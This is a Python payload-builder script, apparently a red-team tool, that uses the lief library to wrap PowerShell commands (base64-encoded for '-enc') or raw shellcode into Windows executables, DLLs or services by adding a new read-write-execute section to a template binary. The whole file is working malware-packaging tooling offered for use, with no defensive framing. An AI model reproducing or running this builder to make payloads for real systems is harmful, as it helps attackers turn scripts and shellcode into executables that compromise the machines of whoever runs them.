#!/usr/bin/env python3

import argparse
import lief
import os
from base64 import b64encode

def align(sz: int, al: int):
    # Align sz with al
    return sz + al - sz % al if sz >= 0 else 0;

def pad_data(data: bytes, al: int):
    # Pad data to make it align with al
    return data + (b'\x00' * (align(len(data), al) - len(data)))

def insert_section(template, section_name, data):
    pe = lief.PE.parse(template) # Template file

    file_alignment = pe.optional_header.file_alignment

    data = pad_data(data, file_alignment) # Padding
    section = lief.PE.Section(section_name)
    section.content = list(data)
    section.size = len(data)
    section.characteristics = (lief.PE.Section.CHARACTERISTICS.MEM_READ
                                | lief.PE.Section.CHARACTERISTICS.MEM_WRITE
                                | lief.PE.Section.CHARACTERISTICS.MEM_EXECUTE
                                | lief.PE.Section.CHARACTERISTICS.CNT_INITIALIZED_DATA)

    # lief will take care of this :)
    pe.add_section(section)
    pe.optional_header.sizeof_image = 0

    return pe

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument('-t', "--type", metavar='<type>', choices=['exe', 'dll', 'service'],
                       help="Type of the generated payload: exe,dll,service", default="exe")

    parser.add_argument('-o', "--output", metavar='<output>', type=str,
                        help="Path of generated executable", default="payload")

    group = parser.add_mutually_exclusive_group()

    group.add_argument('-f', "--file", metavar='<script.ps1>', type=argparse.FileType('r'),
                        help='Script file to be loaded')
    group.add_argument('-p', "--payload", metavar='<payload>', type=str,
                        help="Oneline payload")
    group.add_argument('-s', "--shellcode", metavar='<shellcode>', type=argparse.FileType('rb'),
                        help="Shellcode file")

    args = parser.parse_args()

    section_name = ".script"
    ext = ".exe" if args.type != "dll" else ".dll"

    payload = None
    if f := args.file:
        payload = b"-enc " + b64encode(f.read().encode('utf-16-le')) # Encode the powershell script
        f.close()
    elif p := args.payload:
        payload = b"-enc " + b64encode(p.encode('utf-16-le')) # Encode the powershell script
    elif s := args.shellcode:
        payload = s.read()
        section_name = ".shellc"
        s.close()
    else:
        payload = input("Your One-line powershell payload > ")
        payload = b"-enc " + b64encode(payload.encode('utf-16-le'))

    if not payload:
        print("Invalid payload. Aborting.")
        exit()

    pe = insert_section(f"template-{args.type}", section_name, payload)

    if(os.path.exists(args.output + ext)):
        os.remove(args.output + ext)

    builder = lief.PE.Builder(pe)
    builder.build()
    builder.write(args.output + ext)
